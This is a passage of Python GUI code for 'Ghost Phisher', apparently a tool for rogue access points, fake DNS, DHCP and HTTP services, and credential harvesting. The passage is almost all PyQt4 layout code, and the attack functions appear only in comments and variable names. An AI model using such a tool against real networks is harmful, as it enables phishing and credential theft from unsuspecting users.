from PyQt4 import QtCore, QtGui


try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

import os                   # For operating system related call e.g [os.listdir()]
import sys                  # For validating execution of GUI components e.g [QApplication(sys.argv)]
import time                 # For displaying time of executed attacks
import thread               # For running services in a sub-processed loop(threads)
import socket               # For network based servcies e.g DNS
import urllib2              # For getting the source code of websites that user wants to clone
import sqlite3              # For saving fetched credentials to database
import commands             # For executing shell commands and getting system output e.g DHCP3
import subprocess           # For reading live output from terminal processes

from tip_settings import tip_settings
from font_settings import font_settings
from settings import *

cwd = os.getcwd()                                                        # This will be used as working directory after HTTP is launch
                                                                         # Thats because the HTTP server changes directory after launch

#
# Global variables
#
usable_interface_cards = {}                                     #Dictionary holding interface cards and addresses
interface_card_list = []                                        # Holds interface card names

# Global variables for Fake DNS
dns_contol = 1                                                  #Used to control the DNS Service
dns_connections = 0                                             # Display numbers of dns connections on the tab label
dns_ip_and_websites = {}                                        # Holds mappings of fake ip to dns

# Global variables for Fake DHCP
dhcp_installation_status = ''                                 # Holds the DHCP installation status
dhcp_server_binary = ''
dhcp_config_file = "/tmp/ghost_dhcpd.conf"
dhcp_pid_file = "/tmp/ghost_dhcpd.pid"

# Global variables for Fake HTTP
http_installation_status = ''                                 # Holds the HTTP installation status

# Global variables for Sniffer process
ettercap_installation_status = ''                                 # Holds the ettercap installation status

# Global variables for Fake HTTP
http_server_port = 80                                           # Default HTTP port
http_control = 0                                                # Used to control the credential searching thread

# Global variables for Credential Harvester
captured_credential = 0                                         # Holds the number of captured crdentials

class Ui_ghost_phisher(object):
    def setupUi(self, ghost_phisher):
        ghost_phisher.setObjectName(_fromUtf8("ghost_phisher"))
        ghost_phisher.resize(786, 655)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(_fromUtf8("%s/gui/images/icon.png"%(cwd))), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        self.centralwidget = QtGui.QWidget(ghost_phisher)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.verticalLayout_10 = QtGui.QVBoxLayout(self.centralwidget)
        self.verticalLayout_10.setObjectName(_fromUtf8("verticalLayout_10"))
        self.graphicsView = QtGui.QGraphicsView(self.centralwidget)
        self.graphicsView.setVerticalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.graphicsView.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarAlwaysOff)
        self.graphicsView.setObjectName(_fromUtf8("graphicsView"))
        self.verticalLayout_10.addWidget(self.graphicsView)
        self.tabWidget = QtGui.QTabWidget(self.centralwidget)

        font = QtGui.QFont()
        try:
            font.setPointSize(int(read_last_settings('font-settings')))
        except IndexError:
            font.setPointSize(7)
            create_settings('font-settings',7)

        self.tabWidget.setFont(font)
        self.tabWidget.setStatusTip(_fromUtf8(""))
        self.tabWidget.setObjectName(_fromUtf8("tabWidget"))
        self.tab_5 = QtGui.QWidget()
        self.tab_5.setObjectName(_fromUtf8("tab_5"))
        self.verticalLayout_36 = QtGui.QVBoxLayout(self.tab_5)
        self.verticalLayout_36.setObjectName(_fromUtf8("verticalLayout_36"))
        self.groupBox_15 = QtGui.QGroupBox(self.tab_5)
        self.groupBox_15.setObjectName(_fromUtf8("groupBox_15"))
        self.verticalLayout_35 = QtGui.QVBoxLayout(self.groupBox_15)
        self.verticalLayout_35.setObjectName(_fromUtf8("verticalLayout_35"))
        self.verticalLayout_34 = QtGui.QVBoxLayout()
        self.verticalLayout_34.setObjectName(_fromUtf8("verticalLayout_34"))
        self.horizontalLayout_40 = QtGui.QHBoxLayout()
        self.horizontalLayout_40.setObjectName(_fromUtf8("horizontalLayout_40"))
        self.access_point_label = QtGui.QLabel(self.groupBox_15)
        self.access_point_label.setObjectName(_fromUtf8("access_point_label"))
        self.horizontalLayout_40.addWidget(self.access_point_label)
        self.channel_label = QtGui.QLabel(self.groupBox_15)
        self.channel_label.setObjectName(_fromUtf8("channel_label"))
        self.horizontalLayout_40.addWidget(self.channel_label)
        self.ip_address_label = QtGui.QLabel(self.groupBox_15)
        self.ip_address_label.setObjectName(_fromUtf8("ip_address_label"))
        self.horizontalLayout_40.addWidget(self.ip_address_label)
        self.main_mac_address_label = QtGui.QLabel(self.groupBox_15)
        self.main_mac_address_label.setObjectName(_fromUtf8("main_mac_address_label"))
        self.horizontalLayout_40.addWidget(self.main_mac_address_label)
        self.verticalLayout_34.addLayout(self.horizontalLayout_40)
        self.access_runtime = QtGui.QLabel(self.groupBox_15)
        self.access_runtime.setObjectName(_fromUtf8("access_runtime"))
        self.verticalLayout_34.addWidget(self.access_runtime)
        self.verticalLayout_35.addLayout(self.verticalLayout_34)
        self.verticalLayout_36.addWidget(self.groupBox_15)
        self.groupBox_14 = QtGui.QGroupBox(self.tab_5)
        self.groupBox_14.setObjectName(_fromUtf8("groupBox_14"))
        self.verticalLayout_32 = QtGui.QVBoxLayout(self.groupBox_14)
        self.verticalLayout_32.setObjectName(_fromUtf8("verticalLayout_32"))
        self.horizontalLayout_42 = QtGui.QHBoxLayout()
        self.horizontalLayout_42.setObjectName(_fromUtf8("horizontalLayout_42"))
        spacerItem = QtGui.QSpacerItem(213, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_42.addItem(spacerItem)
        self.horizontalLayout_41 = QtGui.QHBoxLayout()
        self.horizontalLayout_41.setObjectName(_fromUtf8("horizontalLayout_41"))
        self.comboBox = QtGui.QComboBox(self.groupBox_14)
        self.comboBox.setEnabled(True)
        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Preferred, QtGui.QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.comboBox.sizePolicy().hasHeightForWidth())
        self.comboBox.setSizePolicy(sizePolicy)
        self.comboBox.setObjectName(_fromUtf8("comboBox"))
        self.horizontalLayout_41.addWidget(self.comboBox)
        spacerItem1 = QtGui.QSpacerItem(11, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_41.addItem(spacerItem1)
        self.refresh_button = QtGui.QPushButton(self.groupBox_14)
        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.refresh_button.sizePolicy().hasHeightForWidth())
        self.refresh_button.setSizePolicy(sizePolicy)
        self.refresh_button.setObjectName(_fromUtf8("refresh_button"))
        self.horizontalLayout_41.addWidget(self.refresh_button)
        self.horizontalLayout_42.addLayout(self.horizontalLayout_41)
        spacerItem2 = QtGui.QSpacerItem(183, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_42.addItem(spacerItem2)
        self.verticalLayout_32.addLayout(self.horizontalLayout_42)
        spacerItem3 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_32.addItem(spacerItem3)
        self.horizontalLayout_38 = QtGui.QHBoxLayout()
        self.horizontalLayout_38.setObjectName(_fromUtf8("horizontalLayout_38"))
        self.acess_interface = QtGui.QLabel(self.groupBox_14)
        self.acess_interface.setObjectName(_fromUtf8("acess_interface"))
        self.horizontalLayout_38.addWidget(self.acess_interface)
        self.mac_address_label = QtGui.QLabel(self.groupBox_14)
        self.mac_address_label.setObjectName(_fromUtf8("mac_address_label"))
        self.horizontalLayout_38.addWidget(self.mac_address_label)
        self.driver_label = QtGui.QLabel(self.groupBox_14)
        self.driver_label.setObjectName(_fromUtf8("driver_label"))
        self.horizontalLayout_38.addWidget(self.driver_label)
        self.monitor_label = QtGui.QLabel(self.groupBox_14)
        self.monitor_label.setObjectName(_fromUtf8("monitor_label"))
        self.horizontalLayout_38.addWidget(self.monitor_label)
        self.verticalLayout_32.addLayout(self.horizontalLayout_38)
        spacerItem4 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_32.addItem(spacerItem4)
        self.horizontalLayout_39 = QtGui.QHBoxLayout()
        self.horizontalLayout_39.setObjectName(_fromUtf8("horizontalLayout_39"))
        self.monitor_button = QtGui.QPushButton(self.groupBox_14)
        sizePolicy = QtGui.QSizePolicy(QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Preferred)
        sizePolicy.setHorizontalStretch(0)
        sizePolicy.setVerticalStretch(0)
        sizePolicy.setHeightForWidth(self.monitor_button.sizePolicy().hasHeightForWidth())
        self.monitor_button.setSizePolicy(sizePolicy)
        self.monitor_button.setObjectName(_fromUtf8("monitor_button"))
        self.horizontalLayout_39.addWidget(self.monitor_button)
        spacerItem5 = QtGui.QSpacerItem(0, 18, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Preferred)
        self.horizontalLayout_39.addItem(spacerItem5)
        self.verticalLayout_32.addLayout(self.horizontalLayout_39)
        spacerItem6 = QtGui.QSpacerItem(20, 11, QtGui.QSizePolicy.Minimum, QtGui.QSizePolicy.Fixed)
        self.verticalLayout_32.addItem(spacerItem6)
        self.verticalLayout_36.addWidget(self.groupBox_14)
        self.groupBox_16 = QtGui.QGroupBox(self.tab_5)
        self.groupBox_16.setObjectName(_fromUtf8("groupBox_16"))
        self.verticalLayout_33 = QtGui.QVBoxLayout(self.groupBox_16)
        self.verticalLayout_33.setObjectName(_fromUtf8("verticalLayout_33"))
        self.horizontalLayout_37 = QtGui.QHBoxLayout()
        self.horizontalLayout_37.setObjectName(_fromUtf8("horizontalLayout_37"))
        self.verticalLayout_31 = QtGui.QVBoxLayout()
        self.verticalLayout_31.setObjectName(_fromUtf8("verticalLayout_31"))
        self.horizontalLayout_35 = QtGui.QHBoxLayout()
        self.horizontalLayout_35.setObjectName(_fromUtf8("horizontalLayout_35"))
        self.verticalLayout_28 = QtGui.QVBoxLayout()
        self.verticalLayout_28.setObjectName(_fromUtf8("verticalLayout_28"))
        self.label_36 = QtGui.QLabel(self.groupBox_16)
        self.label_36.setObjectName(_fromUtf8("label_36"))
        self.verticalLayout_28.addWidget(self.label_36)
        self.label_37 = QtGui.QLabel(self.groupBox_16)
        self.label_37.setObjectName(_fromUtf8("label_37"))
        self.verticalLayout_28.addWidget(self.label_37)
        self.horizontalLayout_35.addLayout(self.verticalLayout_28)
        self.verticalLayout_27 = QtGui.QVBoxLayout()
        self.verticalLayout_27.setObjectName(_fromUtf8("verticalLayout_27"))
        self.access_name_edit = QtGui.QLineEdit(self.groupBox_16)
        self.access_name_edit.setObjectName(_fromUtf8("access_name_edit"))
        self.verticalLayout_27.addWidget(self.access_name_edit)
        self.ip_address_label_2 = QtGui.QLineEdit(self.groupBox_16)
        self.ip_address_label_2.setObjectName(_fromUtf8("ip_address_label_2"))
        self.verticalLayout_27.addWidget(self.ip_address_label_2)
        self.horizontalLayout_35.addLayout(self.verticalLayout_27)
        self.verticalLayout_31.addLayout(self.horizontalLayout_35)
        self.horizontalLayout_36 = QtGui.QHBoxLayout()
        self.horizontalLayout_36.setObjectName(_fromUtf8("horizontalLayout_36"))
        self.label_38 = QtGui.QLabel(self.groupBox_16)
        self.label_38.setObjectName(_fromUtf8("label_38"))
        self.horizontalLayout_36.addWidget(self.label_38)
        self.channel_combo = QtGui.QComboBox(self.groupBox_16)
        self.channel_combo.setObjectName(_fromUtf8("channel_combo"))
        self.horizontalLayout_36.addWidget(self.channel_combo)
        spacerItem7 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_36.addItem(spacerItem7)
        self.verticalLayout_31.addLayout(self.horizontalLayout_36)
        self.horizontalLayout_37.addLayout(self.verticalLayout_31)
        spacerItem8 = QtGui.QSpacerItem(13, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_37.addItem(spacerItem8)
        self.groupBox_18 = QtGui.QGroupBox(self.groupBox_16)
        self.groupBox_18.setObjectName(_fromUtf8("groupBox_18"))
        self.horizontalLayout_32 = QtGui.QHBoxLayout(self.groupBox_18)
        self.horizontalLayout_32.setObjectName(_fromUtf8("horizontalLayout_32"))
        self.horizontalLayout_34 = QtGui.QHBoxLayout()
        self.horizontalLayout_34.setObjectName(_fromUtf8("horizontalLayout_34"))
        self.rouge_radio = QtGui.QRadioButton(self.groupBox_18)
        self.rouge_radio.setChecked(True)
        self.rouge_radio.setObjectName(_fromUtf8("rouge_radio"))
        self.horizontalLayout_34.addWidget(self.rouge_radio)
        spacerItem9 = QtGui.QSpacerItem(28, 11, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_34.addItem(spacerItem9)
        self.wpa_radio = QtGui.QRadioButton(self.groupBox_18)
        self.wpa_radio.setObjectName(_fromUtf8("wpa_radio"))
        self.horizontalLayout_34.addWidget(self.wpa_radio)
        spacerItem10 = QtGui.QSpacerItem(28, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_34.addItem(spacerItem10)
        self.wep_radio = QtGui.QRadioButton(self.groupBox_18)
        self.wep_radio.setObjectName(_fromUtf8("wep_radio"))
        self.horizontalLayout_34.addWidget(self.wep_radio)
        self.lineEdit = QtGui.QLineEdit(self.groupBox_18)
        self.lineEdit.setObjectName(_fromUtf8("lineEdit"))
        self.horizontalLayout_34.addWidget(self.lineEdit)
        self.horizontalLayout_32.addLayout(self.horizontalLayout_34)
        self.horizontalLayout_37.addWidget(self.groupBox_18)
        self.verticalLayout_33.addLayout(self.horizontalLayout_37)
        self.verticalLayout_36.addWidget(self.groupBox_16)
        self.groupBox_17 = QtGui.QGroupBox(self.tab_5)
        self.groupBox_17.setObjectName(_fromUtf8("groupBox_17"))
        self.verticalLayout_29 = QtGui.QVBoxLayout(self.groupBox_17)
        self.verticalLayout_29.setObjectName(_fromUtf8("verticalLayout_29"))
        self.access_textbrowser = QtGui.QTextBrowser(self.groupBox_17)
        self.access_textbrowser.setObjectName(_fromUtf8("access_textbrowser"))
        self.verticalLayout_29.addWidget(self.access_textbrowser)
        self.verticalLayout_36.addWidget(self.groupBox_17)
        self.verticalLayout_30 = QtGui.QVBoxLayout()
        self.verticalLayout_30.setObjectName(_fromUtf8("verticalLayout_30"))
        self.access_connection_label = QtGui.QLabel(self.tab_5)
        self.access_connection_label.setObjectName(_fromUtf8("access_connection_label"))
        self.verticalLayout_30.addWidget(self.access_connection_label)
        self.horizontalLayout_33 = QtGui.QHBoxLayout()
        self.horizontalLayout_33.setObjectName(_fromUtf8("horizontalLayout_33"))
        spacerItem11 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_33.addItem(spacerItem11)
        self.access_start = QtGui.QPushButton(self.tab_5)
        self.access_start.setObjectName(_fromUtf8("access_start"))
        self.horizontalLayout_33.addWidget(self.access_start)
        spacerItem12 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_33.addItem(spacerItem12)
        self.access_stop = QtGui.QPushButton(self.tab_5)
        self.access_stop.setObjectName(_fromUtf8("access_stop"))
        self.horizontalLayout_33.addWidget(self.access_stop)
        spacerItem13 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_33.addItem(spacerItem13)
        self.verticalLayout_30.addLayout(self.horizontalLayout_33)
        self.verticalLayout_36.addLayout(self.verticalLayout_30)
        self.tabWidget.addTab(self.tab_5, _fromUtf8(""))
        self.dns_tab = QtGui.QWidget()
        self.dns_tab.setObjectName(_fromUtf8("dns_tab"))
        self.verticalLayout_25 = QtGui.QVBoxLayout(self.dns_tab)
        self.verticalLayout_25.setObjectName(_fromUtf8("verticalLayout_25"))
        self.verticalLayout_5 = QtGui.QVBoxLayout()
        self.verticalLayout_5.setObjectName(_fromUtf8("verticalLayout_5"))
        self.groupBox = QtGui.QGroupBox(self.dns_tab)
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.verticalLayout_2 = QtGui.QVBoxLayout(self.groupBox)
        self.verticalLayout_2.setObjectName(_fromUtf8("verticalLayout_2"))
        self.horizontalLayout_4 = QtGui.QHBoxLayout()
        self.horizontalLayout_4.setObjectName(_fromUtf8("horizontalLayout_4"))
        self.card_interface_combo = QtGui.QComboBox(self.groupBox)
        self.card_interface_combo.setObjectName(_fromUtf8("card_interface_combo"))
        self.horizontalLayout_4.addWidget(self.card_interface_combo)
        spacerItem14 = QtGui.QSpacerItem(102, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_4.addItem(spacerItem14)
        self.ip_address_combo = QtGui.QComboBox(self.groupBox)
        self.ip_address_combo.setObjectName(_fromUtf8("ip_address_combo"))
        self.horizontalLayout_4.addWidget(self.ip_address_combo)
        self.verticalLayout_2.addLayout(self.horizontalLayout_4)
        self.horizontalLayout_5 = QtGui.QHBoxLayout()
        self.horizontalLayout_5.setObjectName(_fromUtf8("horizontalLayout_5"))
        self.current_card_label = QtGui.QLabel(self.groupBox)
        self.current_card_label.setObjectName(_fromUtf8("current_card_label"))
        self.horizontalLayout_5.addWidget(self.current_card_label)
        spacerItem15 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_5.addItem(spacerItem15)
        self.service_dns_run_label = QtGui.QLabel(self.groupBox)
        self.service_dns_run_label.setObjectName(_fromUtf8("service_dns_run_label"))
        self.horizontalLayout_5.addWidget(self.service_dns_run_label)
        self.verticalLayout_2.addLayout(self.horizontalLayout_5)
        self.horizontalLayout_6 = QtGui.QHBoxLayout()
        self.horizontalLayout_6.setObjectName(_fromUtf8("horizontalLayout_6"))
        self.dns_port = QtGui.QLabel(self.groupBox)
        self.dns_port.setObjectName(_fromUtf8("dns_port"))
        self.horizontalLayout_6.addWidget(self.dns_port)
        spacerItem16 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_6.addItem(spacerItem16)
        self.label_5 = QtGui.QLabel(self.groupBox)
        self.label_5.setObjectName(_fromUtf8("label_5"))
        self.horizontalLayout_6.addWidget(self.label_5)
        self.verticalLayout_2.addLayout(self.horizontalLayout_6)
        self.verticalLayout_5.addWidget(self.groupBox)
        self.groupBox_2 = QtGui.QGroupBox(self.dns_tab)
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.verticalLayout_4 = QtGui.QVBoxLayout(self.groupBox_2)
        self.verticalLayout_4.setObjectName(_fromUtf8("verticalLayout_4"))
        self.resolveall_radio = QtGui.QRadioButton(self.groupBox_2)
        self.resolveall_radio.setChecked(True)
        self.resolveall_radio.setObjectName(_fromUtf8("resolveall_radio"))
        self.verticalLayout_4.addWidget(self.resolveall_radio)
        self.dns_ip_address = QtGui.QLineEdit(self.groupBox_2)
        self.dns_ip_address.setText(_fromUtf8(""))
        self.dns_ip_address.setObjectName(_fromUtf8("dns_ip_address"))
        self.verticalLayout_4.addWidget(self.dns_ip_address)
        self.respond_domain_radio = QtGui.QRadioButton(self.groupBox_2)
        self.respond_domain_radio.setEnabled(True)
        self.respond_domain_radio.setObjectName(_fromUtf8("respond_domain_radio"))
        self.verticalLayout_4.addWidget(self.respond_domain_radio)
        self.horizontalLayout_3 = QtGui.QHBoxLayout()
        self.horizontalLayout_3.setObjectName(_fromUtf8("horizontalLayout_3"))
        self.label_6 = QtGui.QLabel(self.groupBox_2)
        self.label_6.setObjectName(_fromUtf8("label_6"))
        self.horizontalLayout_3.addWidget(self.label_6)
        self.domain_ip = QtGui.QLineEdit(self.groupBox_2)
        self.domain_ip.setObjectName(_fromUtf8("domain_ip"))
        self.horizontalLayout_3.addWidget(self.domain_ip)
        spacerItem17 = QtGui.QSpacerItem(12, 20, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_3.addItem(spacerItem17)
        self.label_7 = QtGui.QLabel(self.groupBox_2)
        self.label_7.setObjectName(_fromUtf8("label_7"))
        self.horizontalLayout_3.addWidget(self.label_7)
        self.domain_label = QtGui.QLineEdit(self.groupBox_2)
        self.domain_label.setObjectName(_fromUtf8("domain_label"))
        self.horizontalLayout_3.addWidget(self.domain_label)
        self.verticalLayout_4.addLayout(self.horizontalLayout_3)
        self.domain_add_button = QtGui.QPushButton(self.groupBox_2)
        self.domain_add_button.setObjectName(_fromUtf8("domain_add_button"))
        self.verticalLayout_4.addWidget(self.domain_add_button)
        self.verticalLayout_5.addWidget(self.groupBox_2)
        self.groupBox_3 = QtGui.QGroupBox(self.dns_tab)
        self.groupBox_3.setObjectName(_fromUtf8("groupBox_3"))
        self.verticalLayout_24 = QtGui.QVBoxLayout(self.groupBox_3)
        self.verticalLayout_24.setObjectName(_fromUtf8("verticalLayout_24"))
        self.dns_textbrowser = QtGui.QTextBrowser(self.groupBox_3)
        self.dns_textbrowser.setObjectName(_fromUtf8("dns_textbrowser"))
        self.verticalLayout_24.addWidget(self.dns_textbrowser)
        self.verticalLayout_5.addWidget(self.groupBox_3)
        self.verticalLayout = QtGui.QVBoxLayout()
        self.verticalLayout.setObjectName(_fromUtf8("verticalLayout"))
        self.dns_connection_label = QtGui.QLabel(self.dns_tab)
        self.dns_connection_label.setObjectName(_fromUtf8("dns_connection_label"))
        self.verticalLayout.addWidget(self.dns_connection_label)
        self.horizontalLayout = QtGui.QHBoxLayout()
        self.horizontalLayout.setObjectName(_fromUtf8("horizontalLayout"))
        spacerItem18 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout.addItem(spacerItem18)
        self.dns_start = QtGui.QPushButton(self.dns_tab)
        self.dns_start.setObjectName(_fromUtf8("dns_start"))
        self.horizontalLayout.addWidget(self.dns_start)
        spacerItem19 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout.addItem(spacerItem19)
        self.dns_stop = QtGui.QPushButton(self.dns_tab)
        self.dns_stop.setObjectName(_fromUtf8("dns_stop"))
        self.horizontalLayout.addWidget(self.dns_stop)
        spacerItem20 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout.addItem(spacerItem20)
        self.verticalLayout.addLayout(self.horizontalLayout)
        self.verticalLayout_5.addLayout(self.verticalLayout)
        self.verticalLayout_25.addLayout(self.verticalLayout_5)
        self.tabWidget.addTab(self.dns_tab, _fromUtf8(""))
        self.tab_2 = QtGui.QWidget()
        self.tab_2.setObjectName(_fromUtf8("tab_2"))
        self.verticalLayout_26 = QtGui.QVBoxLayout(self.tab_2)
        self.verticalLayout_26.setObjectName(_fromUtf8("verticalLayout_26"))
        self.verticalLayout_7 = QtGui.QVBoxLayout()
        self.verticalLayout_7.setObjectName(_fromUtf8("verticalLayout_7"))
        self.groupBox_4 = QtGui.QGroupBox(self.tab_2)
        self.groupBox_4.setObjectName(_fromUtf8("groupBox_4"))
        self.horizontalLayout_9 = QtGui.QHBoxLayout(self.groupBox_4)
        self.horizontalLayout_9.setObjectName(_fromUtf8("horizontalLayout_9"))
        self.verticalLayout_6 = QtGui.QVBoxLayout()
        self.verticalLayout_6.setObjectName(_fromUtf8("verticalLayout_6"))
        self.label = QtGui.QLabel(self.groupBox_4)
        self.label.setObjectName(_fromUtf8("label"))
        self.verticalLayout_6.addWidget(self.label)
        self.label_2 = QtGui.QLabel(self.groupBox_4)
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.verticalLayout_6.addWidget(self.label_2)
        self.label_3 = QtGui.QLabel(self.groupBox_4)
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.verticalLayout_6.addWidget(self.label_3)
        self.horizontalLayout_9.addLayout(self.verticalLayout_6)
        self.verticalLayout_7.addWidget(self.groupBox_4)
        self.groupBox_5 = QtGui.QGroupBox(self.tab_2)
        self.groupBox_5.setObjectName(_fromUtf8("groupBox_5"))
        self.verticalLayout_9 = QtGui.QVBoxLayout(self.groupBox_5)
        self.verticalLayout_9.setObjectName(_fromUtf8("verticalLayout_9"))
        self.horizontalLayout_31 = QtGui.QHBoxLayout()
        self.horizontalLayout_31.setObjectName(_fromUtf8("horizontalLayout_31"))
        self.verticalLayout_3 = QtGui.QVBoxLayout()
        self.verticalLayout_3.setObjectName(_fromUtf8("verticalLayout_3"))
        self.horizontalLayout_29 = QtGui.QHBoxLayout()
        self.horizontalLayout_29.setObjectName(_fromUtf8("horizontalLayout_29"))
        self.label_4 = QtGui.QLabel(self.groupBox_5)
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.horizontalLayout_29.addWidget(self.label_4)
        self.start_ip = QtGui.QLineEdit(self.groupBox_5)
        self.start_ip.setObjectName(_fromUtf8("start_ip"))
        self.horizontalLayout_29.addWidget(self.start_ip)
        self.verticalLayout_3.addLayout(self.horizontalLayout_29)
        self.horizontalLayout_14 = QtGui.QHBoxLayout()
        self.horizontalLayout_14.setObjectName(_fromUtf8("horizontalLayout_14"))
        self.label_9 = QtGui.QLabel(self.groupBox_5)
        self.label_9.setObjectName(_fromUtf8("label_9"))
        self.horizontalLayout_14.addWidget(self.label_9)
        self.subnet_ip = QtGui.QLineEdit(self.groupBox_5)
        self.subnet_ip.setObjectName(_fromUtf8("subnet_ip"))
        self.horizontalLayout_14.addWidget(self.subnet_ip)
        self.verticalLayout_3.addLayout(self.horizontalLayout_14)
        self.horizontalLayout_12 = QtGui.QHBoxLayout()
        self.horizontalLayout_12.setObjectName(_fromUtf8("horizontalLayout_12"))
        self.label_10 = QtGui.QLabel(self.groupBox_5)
        self.label_10.setObjectName(_fromUtf8("label_10"))
        self.horizontalLayout_12.addWidget(self.label_10)
        self.fakedns_ip = QtGui.QLineEdit(self.groupBox_5)
        self.fakedns_ip.setObjectName(_fromUtf8("fakedns_ip"))
        self.horizontalLayout_12.addWidget(self.fakedns_ip)
        self.verticalLayout_3.addLayout(self.horizontalLayout_12)
        self.horizontalLayout_31.addLayout(self.verticalLayout_3)
        self.horizontalLayout_30 = QtGui.QHBoxLayout()
        self.horizontalLayout_30.setObjectName(_fromUtf8("horizontalLayout_30"))
        spacerItem21 = QtGui.QSpacerItem(0, 78, QtGui.QSizePolicy.Fixed, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_30.addItem(spacerItem21)
        self.verticalLayout_8 = QtGui.QVBoxLayout()
        self.verticalLayout_8.setObjectName(_fromUtf8("verticalLayout_8"))
        self.horizontalLayout_10 = QtGui.QHBoxLayout()
        self.horizontalLayout_10.setObjectName(_fromUtf8("horizontalLayout_10"))
        self.label_8 = QtGui.QLabel(self.groupBox_5)
        self.label_8.setObjectName(_fromUtf8("label_8"))
        self.horizontalLayout_10.addWidget(self.label_8)
        self.stop_ip = QtGui.QLineEdit(self.groupBox_5)
        self.stop_ip.setObjectName(_fromUtf8("stop_ip"))
        self.horizontalLayout_10.addWidget(self.stop_ip)
        self.verticalLayout_8.addLayout(self.horizontalLayout_10)
        self.horizontalLayout_8 = QtGui.QHBoxLayout()
        self.horizontalLayout_8.setObjectName(_fromUtf8("horizontalLayout_8"))
        self.label_12 = QtGui.QLabel(self.groupBox_5)
        self.label_12.setObjectName(_fromUtf8("label_12"))
        self.horizontalLayout_8.addWidget(self.label_12)
        self.gateway_ip = QtGui.QLineEdit(self.groupBox_5)
        self.gateway_ip.setObjectName(_fromUtf8("gateway_ip"))
        self.horizontalLayout_8.addWidget(self.gateway_ip)
        self.verticalLayout_8.addLayout(self.horizontalLayout_8)
        self.horizontalLayout_2 = QtGui.QHBoxLayout()
        self.horizontalLayout_2.setObjectName(_fromUtf8("horizontalLayout_2"))
        self.label_11 = QtGui.QLabel(self.groupBox_5)
        self.label_11.setObjectName(_fromUtf8("label_11"))
        self.horizontalLayout_2.addWidget(self.label_11)
        self.alternatedns_ip = QtGui.QLineEdit(self.groupBox_5)
        self.alternatedns_ip.setObjectName(_fromUtf8("alternatedns_ip"))
        self.horizontalLayout_2.addWidget(self.alternatedns_ip)
        self.verticalLayout_8.addLayout(self.horizontalLayout_2)
        self.horizontalLayout_30.addLayout(self.verticalLayout_8)
        self.horizontalLayout_31.addLayout(self.horizontalLayout_30)
        self.verticalLayout_9.addLayout(self.horizontalLayout_31)
        self.verticalLayout_7.addWidget(self.groupBox_5)
        self.groupBox_6 = QtGui.QGroupBox(self.tab_2)
        self.groupBox_6.setObjectName(_fromUtf8("groupBox_6"))
        self.verticalLayout_23 = QtGui.QVBoxLayout(self.groupBox_6)
        self.verticalLayout_23.setObjectName(_fromUtf8("verticalLayout_23"))
        self.dhcp_status = QtGui.QTextBrowser(self.groupBox_6)
        self.dhcp_status.setObjectName(_fromUtf8("dhcp_status"))
        self.verticalLayout_23.addWidget(self.dhcp_status)
        self.verticalLayout_7.addWidget(self.groupBox_6)
        self.horizontalLayout_13 = QtGui.QHBoxLayout()
        self.horizontalLayout_13.setObjectName(_fromUtf8("horizontalLayout_13"))
        spacerItem22 = QtGui.QSpacerItem(40, 20, QtGui.QSizePolicy.Expanding, QtGui.QSizePolicy.Minimum)
        self.horizontalLayout_13.addItem(spacerItem22)
        self.dhcp_start = QtGui.QPushButton(self.tab_2)
        self.dhcp_start.setObjectName(_fromUtf8("dhcp_start"))
